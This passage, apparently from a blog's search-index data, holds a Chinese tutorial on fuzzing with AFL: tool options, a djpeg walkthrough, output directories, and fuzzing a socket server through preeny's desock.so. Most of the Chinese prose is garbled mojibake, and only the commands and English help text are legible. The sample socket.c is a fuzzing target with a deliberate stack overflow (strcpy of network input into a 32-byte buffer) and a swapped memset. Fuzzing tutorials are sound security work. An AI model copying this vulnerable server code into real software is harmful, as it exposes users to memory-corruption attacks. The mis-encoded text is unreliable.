‡å‡†è¾“å‡ºçš„æ–¹å¼å–‚ç»™è¦fuzzçš„ç¨‹åºï¼Œå¦‚æœfuzzç¨‹åºæ˜¯ä»å‚æ•°æŒ‡å®šçš„æ–‡ä»¶ä¸­è¯»å–æ•°æ®è¿›è¡Œå¤„ç†çš„ï¼Œåˆ™éœ€è¦ä½¿ç”¨ '@@' æ¥ä»£æ›¿è¾“å…¥çš„æ–‡ä»¶è·¯å¾„ï¼Œæ¯”å¦‚åŸæœ¬æ‰§è¡Œçš„æŒ‡ä»¤ä¸º 'djpeg in_afl_min/1.jpeg' ï¼Œfuzzæ—¶æŒ‡ä»¤åº”ä¸º '/usr/bin/djpeg @@' # åœ¨å®‰è£…äº†qemu-modeæ—¶ï¼Œå¯ä»¥æ”¯æŒ '-Q' é€‰é¡¹ï¼Œå¦‚æœç›®æ ‡å¯æ‰§è¡Œç¨‹åº afl-analyze -i in_afl_min/1.jpeg -Q -- /usr/bin/djpeg @@ 4. afl-showmap afl-showmapç”¨äºåˆ†ææ ·æœ¬çš„æ‰§è¡Œè·¯å¾„ï¼Œæ¯”å¦‚åˆ†æä¸€ä¸ªæ ·æœ¬1.jpegï¼Œè¢«fuzzç¨‹åºä¸º/usr/bin/djpegï¼Œè¯¥ç¨‹åºä½¿ç”¨æ–¹æ³•ä¸º/usr/bin/djpeg [å‚æ•°] è¦è§£æçš„å›¾ç‰‡æ–‡ä»¶ # æŒ‡ä»¤æ ¼å¼ï¼ˆä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–ï¼‰ï¼š afl-showmap -o å­˜æ”¾ç»“æœçš„æ–‡ä»¶ -- è¦fuzzçš„å¯æ‰§è¡Œç¨‹åº [ç¨‹åºå‚æ•°] \u003c æ ·æœ¬æ–‡ä»¶è·¯å¾„ # æŒ‡ä»¤æ ¼å¼ï¼ˆä»å‚æ•°æŒ‡å®šæ–‡ä»¶ä¸­è¯»å–è¾“å…¥ï¼‰ï¼š afl-showmap -o å­˜æ”¾ç»“æœçš„æ–‡ä»¶ -- è¦fuzzçš„å¯æ‰§è¡Œç¨‹åº [ç¨‹åºå‚æ•°] # å…¶ä¸­ 'è¦fuzzçš„å¯æ‰§è¡Œç¨‹åº' å¿…é¡»æ˜¯å¸¦æœ‰è·¯å¾„çš„ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œæ¯”å¦‚ 'djpeg 1.jpeg' å¯ä»¥æ‰§è¡ŒæˆåŠŸï¼Œä½†æ˜¯fuzzæ—¶å¿…é¡»å°† 'djpeg' çš„è·¯å¾„ä¸€å¹¶å¸¦ä¸Šæ‰å¯ä»¥ï¼Œå³ '/usr/bin/djpeg' # åœ¨å®‰è£…äº†qemu-modeæ—¶ï¼Œå¯ä»¥æ”¯æŒ '-Q' é€‰é¡¹ï¼Œå¦‚æœç›®æ ‡å¯æ‰§è¡Œç¨‹åº # å› ä¸º/usr/bin/djpegæŒ‡ä»¤å³å¯ç”¨å‚æ•°æŒ‡å®šæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ ‡å‡†è¾“å…¥ï¼Œæ‰€ä»¥ä»¥ä¸‹ä¸¤ç§æ–¹å¼å‡å¯ afl-showmap -o map -Q -- /usr/bin/djpeg in_afl_min/1.jpeg afl-showmap -o map -Q -- /usr/bin/djpeg \u003c in_afl_min/1.jpeg # æŸ¥çœ‹ç»“æœ cat map 5. afl-fuzz afl-fuzzæ˜¯çœŸæ­£è¿›è¡Œfuzzçš„ç¨‹åºï¼Œé€šè¿‡afl-fuzz helpå¯ä»¥æŸ¥çœ‹æ”¯æŒçš„æ‰€æœ‰é€‰é¡¹ï¼ˆå…¶å®ƒå‘½ä»¤ä¹Ÿå¯ä»¥ï¼‰ï¼Œé€‰é¡¹å¦‚ä¸‹ afl-fuzz 2.56b by \u003clcamtuf@google.com\u003e afl-fuzz [ options ] -- /path/to/fuzzed_app [ ... ] Required parametersï¼ˆå¿…é¡»å‚æ•°ï¼‰: -i dir - input directory with test cases - å­˜æ”¾æ ·æœ¬çš„ç›®å½• -o dir - output directory for fuzzer findings - fuzzè¾“å‡ºçš„æ•°æ®å­˜æ”¾ç›®å½• Execution control settingsï¼ˆæ‰©å±•æ§åˆ¶è®¾ç½®ï¼‰: -f file - location read by the fuzzed program (stdin) - æŒ‡å®šç¼–è¯‘æ–‡ä»¶çš„æ–‡ä»¶æ‰©å±•å -t msec - timeout for each run (auto-scaled, 50-1000 ms) - æŒ‡å®šç¨‹åºè¶…æ—¶æ—¶é—´ -m megs - memory limit for child process (50 MB) - é™åˆ¶å­è¿›ç¨‹ä½¿ç”¨çš„å†…å­˜ -Q - use binary-only instrumentation (QEMU mode) - ä½¿ç”¨qemu-modeè¿›è¡ŒäºŒè¿›åˆ¶æ’æ¡© Fuzzing behavior settingsï¼ˆè®¾ç½®ç¼–è¯‘æ“ä½œï¼‰: -d - quick \u0026 dirty mode (skips deterministic steps) - ä¸è¿›è¡Œç¡®å®šæ€§å˜å¼‚ï¼Œåªè¿›è¡Œéšæœºæ€§å˜å¼‚ -n - fuzz without instrumentation (dumb mode) - ä¸è¿›è¡Œéšæœºæ€§ç¼–è¯‘ï¼Œåªè¿›è¡Œç¡®å®šæ€§å˜å¼‚ -x dir - optional fuzzer dictionary (see README) - dictionaryä½¿ç”¨çš„ç”¨æˆ·æŒ‡å®štokenå­˜æ”¾çš„ç›®å½• Other stuffï¼ˆå…¶ä»–é€‰é¡¹ï¼‰: -T text - text banner to show on the screen - åœ¨å±å¹•ä¸Šæ˜¾ç¤ºçš„bannerä¿¡æ¯ -M / -S id - distributed mode (see parallel_fuzzing.txt) - å¹¶è¡Œfuzzï¼Œ â€”Mä¸ºä¸»èŠ‚ç‚¹ï¼Œ-Sä¸ºå­èŠ‚ç‚¹ -C - crash exploration mode (the peruvian rabbit thing) - åˆ†æå´©æºƒæ¨¡å¼ For additional tips, please consult /usr/local/share/doc/afl/README. # å’Œ`afl-cmin`ã€`afl-tmin`ç›¸åŒï¼Œé»˜è®¤å‘æ ‡å‡†è¾“å…¥fuzzæ•°æ®ï¼Œå¦‚æœè¢«fuzzæŒ‡ä»¤æ˜¯ä»å‚æ•°æŒ‡å®šæ–‡ä»¶ä¸­è¯»å–æ•°æ®ï¼Œåˆ™ä½¿ç”¨`@@`æ›¿æ¢æ–‡ä»¶å‚æ•° # å®˜æ–¹è¯¦ç»†è¯´æ˜å¯ä»¥åœ¨é¡¹ç›®æ ¹ç›®å½•çš„'README.md'æ–‡ä»¶ä¸­æŸ¥çœ‹ å¯¹å·²ç»è¿›è¡Œè¿‡æºç æ’æ¡©çš„ç¨‹åºï¼ŒåŸºæœ¬æŒ‡ä»¤ä¸ºï¼š afl-fuzz -i in_dir -o out_dir -- /path/to/fuzzed_app [ ... ] å¯¹æ²¡æœ‰è¿›è¡Œè¿‡æºä»£ç æ’æ¡©çš„ç¨‹åºï¼ŒåŸºæœ¬æŒ‡ä»¤ä¸ºï¼š afl-fuzz -i in_dir -o out_dir -Q -- /path/to/fuzzed_app [ ... ] afl-fuzzçš„è¿è¡Œç‰¹ç‚¹æ˜¯ï¼Œä¸ç®¡ç³»ç»ŸçœŸå®ä¸ºå¤šå°‘æ ¸ï¼Œåªä½¿ç”¨å…¶ä¸­ä¸€ä¸ªï¼Œæ‰€ä»¥åªè¿è¡Œä¸€ä¸ªfuzzè¿›ç¨‹ä¼šå‘ç°CPUä½¿ç”¨ç‡ä¸é«˜ã€‚ä¸è¿‡afl-fuzzæä¾›äº†å¹¶è¡Œfuzzçš„é€‰é¡¹ï¼Œå¹¶è¡Œè¿è¡Œæ—¶åŸºæœ¬æŒ‡ä»¤ä¸ºï¼š afl-fuzz -i in_dir -o out_dir [-Q] -M mast_name -- /path/to/fuzzed_app [ ... ] afl-fuzz -i in_dir -o out_dir [-Q] -S slave_name1 -- /path/to/fuzzed_app [ ... ] afl-fuzz -i in_dir -o out_dir [-Q] -S s","date":"2020-12-03","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:3:1","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 1","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"2. åŸºæœ¬ä½¿ç”¨æ ·ä¾‹ ï¼ˆæ³¨ï¼šæµ‹è¯•è¿‡ç¨‹ä¸­å› ä¸ºæˆ‘å®‰è£…äº†å¤šä¸ªç‰ˆæœ¬çš„aflå’Œafl++ï¼Œæ‰€ä»¥æœ‰äº›åœ°æ–¹ä½¿ç”¨çš„æ˜¯ç»å¯¹è·¯å¾„ï¼Œåœ¨åªæœ‰å•ç‰ˆæœ¬å•ç¯å¢ƒå˜é‡çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼‰ ä»¥djpegç¨‹åºä¸ºä¾‹è¿›è¡Œï¼Œè¯¥ç¨‹åºå¯é€šè¿‡apt-get install libjpeg-progsè¿›è¡Œå®‰è£…ï¼Œå®‰è£…åç›´æ¥å°±æ˜¯äºŒè¿›åˆ¶ç¨‹åºï¼Œæ‰€ä»¥ä½¿ç”¨çš„æŒ‡ä»¤éƒ½å¸¦æœ‰-Qé€‰é¡¹ï¼Œå¦‚æœè¦fuzzçš„ç¨‹åºç¼–è¯‘æ—¶ä½¿ç”¨çš„æ˜¯afl-gccã€afl-g++ã€afl-clangã€afl-clang++ã€afl-clang-fastã€afl-clang-fast++è¿™äº›æŒ‡ä»¤ï¼Œfuzzçš„å¤§è‡´æµç¨‹ç±»ä¼¼ï¼Œåªéœ€è¦å°†å‘½ä»¤ä¸­çš„-Qé€‰é¡¹å»æ‰å³å¯ã€‚ é€šè¿‡ whereis djpeg æŒ‡ä»¤æŸ¥çœ‹ djpeg çš„ç»å¯¹è·¯å¾„ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è·¯å¾„ä¸º /usr/bin/djpeg whereis djpeg åˆ›å»ºä¸¤ä¸ªç›®å½• in_dir å’Œ out_dir ï¼Œåˆ†åˆ«ç”¨äºå­˜æ”¾æˆ‘ä»¬è¾“å…¥çš„æ ·æœ¬å’Œaflçš„fuzzç»“æœ mkdir in_dir mkdir out_dir å‘ in_dir ä¸­æ”¾å…¥æ ·æœ¬ï¼Œè¿™äº›æ ·æœ¬å¯ä»¥è‡ªè¡Œæ”¶é›†ï¼Œä¸è¿‡æ ·æœ¬æ–‡ä»¶éœ€è¦å°½é‡å°ï¼Œå¦åˆ™å˜å¼‚é˜¶æ®µä¼šèŠ±è´¹è¾ƒå¤šæ—¶é—´ï¼Œé™ä½æ•ˆç‡ï¼Œè¿™é‡Œæˆ‘è¾“å…¥ä¸¤ä¸ªæ ·æœ¬ 1 å’Œ 2 ï¼Œå†…å®¹åˆ†åˆ«ä¸º hello å’Œ testï¼Œåœ¨å‡†å¤‡ä¸€ä¸ªå¾ˆå°çš„å›¾ç‰‡æ–‡ä»¶ï¼ˆå¯é€šè¿‡ç»˜å›¾å·¥å…·æˆªä¸‹ä¸€å°å—ï¼Œä»¥jpegå½¢å¼ä¿å­˜å³å¯ï¼‰ï¼Œå‘½åä¸º3æ”¾å…¥æ ·æœ¬ç›®å½•ä¸­ echo 'hello' \u003e in_dir/1 echo 'test' \u003e in_dir/2 ä½¿ç”¨ afl-cmin å¯¹è¾“å…¥æ ·æœ¬é›†åˆè¿›è¡Œè£å‰ªï¼Œå…ˆåˆ›å»ºä¸€ä¸ªè¾“å‡ºç›®å½• in_dir_min ï¼Œç„¶åæ‰§è¡Œè£å‰ªæŒ‡ä»¤ mkdir in_dir_min afl-cmin -i in_dir -o in_dir_min -Q -- /usr/bin/djpeg @@ è£å‰ªè¿‡åç›®å½•ä¸­åªä¿ç•™äº†2 å’Œ 3. ä½¿ç”¨ afl-tmin å¯¹è£å‰ªåé›†åˆä¸­æ‰€æœ‰çš„æ ·æœ¬è¿›è¡Œå¤§å°è£å‰ªï¼ˆè¯¥æ­¥éª¤äº§ç”Ÿçš„è£å‰ªåæ ·æœ¬ä¸ä¸€å®šè¦ä½¿ç”¨ï¼Œéœ€è¦é€šè¿‡ afl-analyze æŒ‡ä»¤è¿›è¡Œè£å‰ªå‰åå¯¹æ¯”åˆ†æï¼Œè‡ªè¡Œåˆ¤æ–­ä½¿ç”¨å“ªä¸€ä¸ªï¼Œè£å‰ªå‰åä¸¤ä¸ªæ ·æœ¬ä¸€å®šåªä¿ç•™ä¸€ä¸ªæ”¾å…¥æœ€ç»ˆæ ·æœ¬é›†ä¸­ï¼‰ afl-tmin -i in_dir_min/2 -o in_dir_min/2_min -Q -- /usr/bin/djpeg @@ afl-tmin -i in_dir_min/3 -o in_dir_min/3_min -Q -- /usr/bin/djpeg @@ è£å‰ªåå¾—åˆ°çš„å†…å®¹å¦‚ä¸‹ï¼š ä½¿ç”¨ afl-analyze åˆ†åˆ«å¯¹è£å‰ªå‰åçš„æ ·æœ¬è¿›è¡Œåˆ†æï¼Œå…ˆå¯¹æ¯”åˆ†æ 3 å’Œ 3_min afl-analyze -i in_dir_min/3 -Q -- /usr/bin/djpeg @@ afl-analyze -i in_dir_min/3_min -Q -- /usr/bin/djpeg @@ é¦–å…ˆæ˜¯å¯¹3çš„åˆ†æï¼š ç„¶åæ˜¯å¯¹3_minçš„åˆ†æï¼š afl-tmin è£å‰ªæ—¶éµå¾ªçš„æ˜¯æ‰§è¡Œè·¯å¾„ä¸å˜åŸåˆ™ï¼Œä½†æ˜¯ä¹Ÿæœ‰å¯èƒ½ç ´ååŸæ–‡ä»¶ä¸­å¯¹æŸäº›æ ‡å¿—æ•°æ®ï¼Œå°±å¦‚åŒä¸Šå›¾ 3 å’Œ 3_min åˆ†æçš„ç»“æœï¼Œaflåœ¨è¯†åˆ«æ–‡ä»¶ç»“æ„æ—¶ï¼Œ 3 å’Œ 3_min æ˜¯ä¸åŒçš„ï¼Œè¿™ä¸ªä¸åŒä¼šå¯¼è‡´åç»­fuzzæ—¶å˜å¼‚é˜¶æ®µçš„ä¸åŒï¼Œæ‰€ä»¥æˆ‘è®¤ä¸ºåœ¨è¿™ç§æƒ…å†µä¸‹ 3_min ä¸èƒ½å®Œå…¨å–ä»£ 3 ã€‚ å†å¯¹æ¯”ä¸‹ 2 å’Œ 2_min afl-analyze -i in_dir_min/2 -Q -- /usr/bin/djpeg @@ afl-analyze -i in_dir_min/2_min -Q -- /usr/bin/djpeg @@ åŒç†ï¼Œå¯¹æ¯”è¿™ä¸¤ä¸ªæ ·æœ¬ï¼Œè¿›è¡Œå–èˆã€‚ æœ€ç»ˆï¼Œé€‰å– 2 å’Œ 3 ä½œä¸ºæœ€ç»ˆæ ·æœ¬é›†ï¼Œå³æœªè¿›è¡Œ afl-tmin è£å‰ªçš„æ ·æœ¬ï¼Œæ”¾å…¥æ–°å»ºçš„ in ç›®å½•ä¸­ mkdir in cp in_dir_min/2 in cp in_dir_min/3 in ä½¿ç”¨ afl-fuzz è¿›è¡Œfuzzï¼Œè¿™é‡Œé‡‡ç”¨å¹¶è¡Œfuzzæ¨¡å¼ï¼ŒæŒ‡ä»¤å¦‚ä¸‹ afl-fuzz -i in -o out_dir -Q -M djpeg_master -- /usr/bin/djpeg @@ # å¦ä¸€ä¸ªç»ˆç«¯ afl-fuzz -i in -o out_dir -Q -S djpeg_slaver_1 -- /usr/bin/djpeg @@ è‡³æ­¤ï¼Œæœ€åŸºæœ¬çš„ä½¿ç”¨ afl å°±å·®ä¸å¤šäº†ï¼Œåç»­å°±æ˜¯ç­‰å¾…å‡ºç°å´©æºƒï¼Œåˆ†æå´©æºƒäº†ã€‚ ","date":"2020-12-03","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:3:2","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 1","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"3. è¿è¡ŒçŠ¶æ€è¯´æ˜ ä¸Šé¢å·²ç»ç»™å‡ºäº†AFLçš„è¿è¡Œæ—¶çš„çŠ¶æ€å›¾ï¼Œå®˜æ–¹å¯¹è¯¥ç•Œé¢çš„è¯´æ˜åœ¨ https://github.com/google/AFL/blob/master/docs/status_screen.txt ï¼Œæˆ–è€…åœ¨é¡¹ç›® docs/status_screen.txt ä¸­æŸ¥çœ‹ã€‚ ä¸‹é¢å¯¹ç•Œé¢ä¸­å„ä¸ªéƒ¨åˆ†åšç®€å•è¯´æ˜ï¼š Process timingï¼šFuzzerè¿è¡Œæ—¶é•¿ã€ä»¥åŠè·ç¦»æœ€è¿‘å‘ç°çš„è·¯å¾„ã€å´©æºƒå’ŒæŒ‚èµ·ç»è¿‡äº†å¤šé•¿æ—¶é—´ï¼› Overall resultsï¼šFuzzerå½“å‰çŠ¶æ€çš„æ¦‚è¿°ï¼› Cycle progressï¼šæˆ‘ä»¬è¾“å…¥é˜Ÿåˆ—çš„è·ç¦»ï¼› Map coverageï¼šç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„æ’æ¡©ä»£ç æ‰€è§‚å¯Ÿåˆ°è¦†ç›–èŒƒå›´çš„ç»†èŠ‚ï¼› Stage progressï¼šFuzzerç°åœ¨æ­£åœ¨æ‰§è¡Œçš„æ–‡ä»¶å˜å¼‚ç­–ç•¥ã€æ‰§è¡Œæ¬¡æ•°å’Œæ‰§è¡Œé€Ÿåº¦ï¼› Findings in depthï¼šæœ‰å…³æˆ‘ä»¬æ‰¾åˆ°çš„æ‰§è¡Œè·¯å¾„ï¼Œå¼‚å¸¸å’ŒæŒ‚èµ·æ•°é‡çš„ä¿¡æ¯ï¼› Fuzzing strategy yieldsï¼šå…³äºçªå˜ç­–ç•¥äº§ç”Ÿçš„æœ€æ–°è¡Œä¸ºå’Œç»“æœçš„è¯¦ç»†ä¿¡æ¯ï¼› Path geometryï¼šæœ‰å…³Fuzzeræ‰¾åˆ°çš„æ‰§è¡Œè·¯å¾„çš„ä¿¡æ¯ï¼› CPU004ï¼šCPUåˆ©ç”¨ç‡ã€‚ fuzzç»“æœæŸ¥çœ‹ å•è¿›ç¨‹ä¸‹fuzzç»“æœçš„è¾“å‡ºç›®å½•åŒ…å«ä»¥ä¸‹å‡ ä¸ªï¼š crashesï¼šå­˜æ”¾å»é‡åè§¦å‘crashçš„æ•°æ® fuzz_bitmapï¼šè®°å½•ä»£ç è¦†ç›–ç‡ fuzzer_statsï¼šfuzzçŠ¶æ€ hangsï¼šå­˜æ”¾å»é‡åè§¦å‘æŒ‚èµ·çš„æ•°æ® plot_dataï¼šç»˜å›¾æ•°æ® queueï¼šæœ‰æ•ˆçš„æ ·æœ¬é›†åˆ queque ç›®å½•ä¸‹å­˜æ”¾ç€æœ‰æ•ˆçš„æ ·æœ¬é›†åˆï¼Œæˆ‘ä»¬å¯ä»¥ä»ç›®å½•ä¸­æ–‡ä»¶çš„æ–‡ä»¶åå¾—çŸ¥æ ·æœ¬æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Œæ¯”å¦‚ä¸‹å›¾ä¸­ æ–‡ä»¶åä¸­åŒ…å«ä¸€äº›è¯´æ˜æ€§å­—æ®µï¼š idï¼šæ ·æœ¬id origï¼šæ¥è‡ªç”¨æˆ·æŒ‡å®šçš„æ ·æœ¬é›†åˆï¼Œå†…å®¹å’Œå¯¹åº”çš„æºæ ·æœ¬ä¸€æ · srcï¼šä»å“ªäº›æ ·æœ¬idå˜å¼‚è€Œæ¥ opï¼šä»å˜å¼‚çš„å“ªä¸ªé˜¶æ®µäº§ç”Ÿçš„ è¿™æ ·å°±å¯ä»¥å¾—çŸ¥æœ‰æ•ˆæ ·æœ¬çš„æ¥æºã€‚ crashes ç›®å½•ä¸‹å­˜æ”¾ç€å»é‡åè§¦å‘å´©æºƒçš„è¾“å…¥ï¼Œæˆ‘ä»¬å¯ä»¥ä»ç›®å½•ä¸­æ–‡ä»¶çš„æ–‡ä»¶åå¾—çŸ¥æ•°æ®æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Œæ¯”å¦‚ä¸‹å›¾ä¸­ å­—æ®µå«ä¹‰å’Œ queque ç›®å½•ä¸­æ–‡ä»¶ååŸºæœ¬ä¸€è‡´ã€‚ ","date":"2020-12-03","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:3:3","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 1","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"4. è¿›é˜¶ä½¿ç”¨ 1. ä½¿ç”¨AFLå¯¹ç«¯å£ç¨‹åºè¿›è¡Œfuzz æˆªæ­¢åˆ°ç›®å‰ä¸ºæ­¢ï¼Œç»å¤§å¤šæ•°çš„ç¨‹åºéƒ½æ˜¯å°†â€˜æ ‡å‡†è¾“å…¥â€™ã€â€˜å‚æ•°æŒ‡å®šæ–‡ä»¶ä¸­çš„æ•°æ®â€™ä»¥åŠâ€˜ç«¯å£æ¥æ”¶çš„æ•°æ®â€™ä½œä¸ºè¾“å…¥ã€‚å‰ä¸¤è€… afl éƒ½å¯ä»¥å¾ˆå¥½çš„å¤„ç†ï¼Œä½†æ˜¯ä¸æ”¯æŒå°†å˜å¼‚æ•°æ®è¾“å…¥åˆ°ç«¯å£ä¸­ï¼Œä¸ºäº†å¯¹è¿™ç±»ç¨‹åºè¿›è¡Œfuzzï¼Œè¿™é‡Œä»‹ç»ä¸€ç§ä¸ç®¡æœ‰æ— æºç éƒ½å¯ä»¥è¿›è¡Œfuzzçš„æ–¹æ³•ã€‚ è¿™é‡Œä½¿ç”¨preenyé¡¹ç›®æ¥è¿›è¡Œæµ‹è¯•ï¼Œå…¶ä¸­åŒ…å«ä¸€äº›é‡å†™çš„ç³»ç»Ÿåº“ï¼Œåœ¨è¿™é‡Œçš„æµ‹è¯•ä¸­ä¸»è¦ä¼šä½¿ç”¨é‡å†™çš„ç½‘ç»œç¨‹åºåº“ï¼Œä»¥å®ç°ä»socketè¯»å–è¾“å…¥è½¬ä¸ºä»æ ‡å‡†è¾“å…¥è¯»å–è¾“å…¥ã€‚å®‰è£…è¿‡ç¨‹ååˆ†ç®€å•ï¼Œè¿›å…¥é¡¹ç›®ä¸»ç›®å½•åï¼Œæ‰§è¡Œmakeè¿›è¡Œå˜å¼‚ï¼ŒæŸ¥çœ‹ x86_64-linux-gnu ä¸‹æ˜¯å¦ç”Ÿæˆ .so åº“æ–‡ä»¶å³å¯ã€‚ è¿™ä¸ªåº“åˆ©ç”¨ LD_PRELOAD æœºåˆ¶ï¼Œé‡å†™äº†å¾ˆå¤šåº“å‡½æ•°ï¼Œå…¶ä¸­ desock.c è¿™ä¸ªæ–‡ä»¶è´Ÿè´£é‡å†™ socket ç›¸å…³çš„å‡½æ•°ï¼Œå…¶å®ç°çš„åŠŸèƒ½å°±æ˜¯å½“åº”ç”¨ä» socket è·å–è¾“å…¥æ—¶ï¼Œæ”¹ä¸ºä» stdin è·å–è¾“å…¥ã€‚ é¦–å…ˆå‡†å¤‡ä¸€ä¸ªsocketç¨‹åºï¼Œè¿™é‡Œä½¿ç”¨å¦‚ä¸‹ä»£ç ä¸ºä¾‹ï¼Œæ–‡ä»¶åä¸º socket.c #include\u003cstdio.h\u003e #include\u003cstdlib.h\u003e #include\u003cstring.h\u003e #include\u003cunistd.h\u003e #include\u003csys/socket.h\u003e #include\u003cnetinet/in.h\u003e #define SERV_PORT 8000 #define SIZE 100 #define MAXLINE 64 int command(char* buf) { char recv[32]; memset(recv, 32, 0); strcpy(recv, buf + 8); return 0; } int main() { struct sockaddr_in servaddr,cliaddr; socklen_t cliaddr_len; int listenfd,connfd; char buf[MAXLINE]; int i,n,flag = 0; listenfd = socket(AF_INET,SOCK_STREAM,0); bzero(\u0026servaddr,sizeof(servaddr)); servaddr.sin_family = AF_INET; servaddr.sin_addr.s_addr = htonl(INADDR_ANY); servaddr.sin_port = htons(SERV_PORT); bind(listenfd,(struct sockaddr *)\u0026servaddr,sizeof(servaddr)); listen(listenfd,20); printf(\"Accepting connections..\\n\"); cliaddr_len = sizeof(cliaddr); connfd = accept(listenfd,(struct sockaddr *)\u0026cliaddr,\u0026cliaddr_len); char send_msg[MAXLINE*2] = \"hello, send by send() :\\n\"; send(connfd, send_msg, strlen(send_msg), 0); n = read(connfd,buf,MAXLINE); if(n!=0){ if(!strncmp(buf, \"test \", 5)) sprintf(send_msg, \"test: %s\\n\", buf + 5); else if(!strncmp(buf, \"help\", 4)) sprintf(send_msg, \"help:\\n\\ttest\\n\\tcommand\\n\\texit\\n\"); else if(!strncmp(buf, \"command \", 8)){ command(buf); sprintf(send_msg, \"it's a command\\n\"); } else if(!strncmp(buf, \"exit\", 4)) send(connfd, \"bye~\\n\", 4, 0); else sprintf(send_msg, \"unknown command!\\n\"); send(connfd, send_msg, strlen(send_msg), 0); } else printf(\"Client say close the connection..\\n\"); close(connfd); } ä½¿ç”¨ gcc è¿›è¡Œç¼–è¯‘ gcc -o socket socket.c è¿è¡Œ socket å¯ä»¥ç›‘å¬ 8000 ç«¯å£è¿›è¡Œsocketé€šä¿¡ é€šè¿‡è®¾ç½® LD_PRELOAD ä½¿ç¨‹åºåŠ è½½ preeny é¡¹ç›®ä¸­ç¼–è¯‘å‡ºæ¥çš„ desock.so åº“ï¼ˆä¸€èˆ¬åœ¨ preeny é¡¹ç›®ä¸‹çš„ x86_64-linux-gnu ç›®å½•ä¸­ï¼‰æ¥æ”¹å˜socketé€šä¿¡ï¼Œå…·ä½“æŒ‡ä»¤å¦‚ä¸‹ï¼ˆæˆ‘çš„ desock.so è·¯å¾„ä¸º /root/Tools/preeny/x86_64-linux-gnu/desock.soï¼‰ # æŒ‡ä»¤æ ¼å¼ï¼š LD_PRELOAD=\"preenyç¼–è¯‘å‡ºçš„desock.soçš„è·¯å¾„\" socketç¨‹åº [å‚æ•°] LD_PRELOAD=\"/home/v4ler1an/Desktop/Fuzz/training/preeny/x86_64-linux-gnu/desock.so\" ./socket æœ€ç»ˆå®ç°çš„ç»“æœå¦‚ä¸‹ï¼š ä»ä¸Šé¢çš„ç»“æœå¯ä»¥çœ‹åˆ° send å‡½æ•°æˆåŠŸå°†æ¶ˆæ¯å‘å¾€äº† stdoutï¼Œrecv å‡½æ•°ä¹ŸæˆåŠŸä» stdin ä¸­æ¥æ”¶äº†æ¶ˆæ¯ã€‚ è¿™æ ·å°±å°† socket è¾“å…¥è½¬å˜ä¸ºäº†æ ‡å‡†è¾“å…¥ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨aflè¿›è¡Œfuzzäº†ã€‚è¿‡ç¨‹å¦‚ä¸‹ï¼š # åˆ›å»ºæ ·æœ¬åŠè¾“å‡ºç›®å½• mkdir in mkdir out # åˆ›å»ºæ ·æœ¬ echo 'test 123' \u003e in/test echo 'xxx' \u003e in/xxx echo 'help' \u003e in/help echo 'exit' \u003e in/exit # å¯¹æ ·æœ¬è¿›è¡Œè£å‰ª mkdir in_min LD_PRELOAD=\"/home/v4ler1an/Desktop/Fuzz/training/preeny/x86_64-linux-gnu/desock.so\" afl-cmin -i in -o in_min -Q -- ./socket # å¼€å§‹fuzz LD_PRELOAD=\"/home/v4ler1an/Desktop/Fuzz/training/preeny/x86_64-linux-gnu/desock.so\" afl-fuzz -i in_min/ -o out/ -Q -- ./socket æˆåŠŸæ‰§è¡Œåå¦‚ä¸‹ï¼š ä»ä¸Šé¢çš„ç»“æœå¯ä»¥çœ‹å‡ºè¿™ç§æ–¹å¼å­˜åœ¨çš„é—®é¢˜ï¼š fuzzæ•ˆç‡å¾ˆä½ å¦‚æœsocketç¨‹åºæ˜¯å¾ªç¯æ¥æ”¶æ•°æ®çš„ï¼Œå› ä¸ºfuzzåªèƒ½å¯¹ç¨‹åºè¿›è¡Œä¸€æ¬¡è¾“å…¥ï¼Œæ‰€ä»¥è¢«fuzzç¨‹åºåœ¨å¤„ç†å®Œè¿™ä¸ªè¾“å…¥åä¼šä¸€ç›´ä¿æŒç­‰å¾…ï¼Œæœ€ç»ˆå¯¼è‡´è¶…æ—¶ï¼Œè€Œaflå¯¹è¶…æ—¶çš„å¤„ç†å¯ä»¥ç®€å•ç†è§£ä¸ºå¿½ç•¥ï¼Œæ‰€ä»¥é’ˆå¯¹è¿™ç§socketç¨‹åºæ˜¯æ— æ³•è¿›è¡Œfuzzçš„ï¼Œå®æˆ˜ä¸­ç»å¤§å¤šæ•°éƒ½æ˜¯å¾ªç¯æ¥æ”¶æ•°æ®çš„ç¨‹åºï¼Œæ‰€ä»¥è¿™ç§æ–¹æ¡ˆå®é™…çš„å¯è¡Œæ€§æœ‰å¾…è€ƒè™‘ã€‚ 2. ä½¿ç”¨llvmæ¨¡å¼è¿›è¡Œfuzz å› ä¸ºä½¿ç”¨è¿™ä¸ªæ¨¡å¼éœ€è¦ä¿®æ”¹æºä»£ç ï¼Œæ‰€ä»¥åªæœ‰å¯¹æœ‰æºç çš„ç¨‹åºè¿›è¡Œfuzzæ—¶æ‰èƒ½ä½¿ç”¨ã€‚ å¯åœ¨é¡¹ç›® llvm_mode ç›®å½•ä¸‹çš„ README.llvm æ–‡ä»¶ä¸­æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£ å°†ä¸Šé¢çš„ä»£ç æ”¹æˆå¾ªç¯è¯»å–çš„å½¢å¼ï¼Œæ–°ä»£ç å¦‚ä¸‹ï¼š #include\u003cstdio.h\u003e #include\u003cstdlib.h\u003e #include\u003cstring.h\u003e #include\u003cunistd.h\u003e #include\u003csys/socket.h\u003e 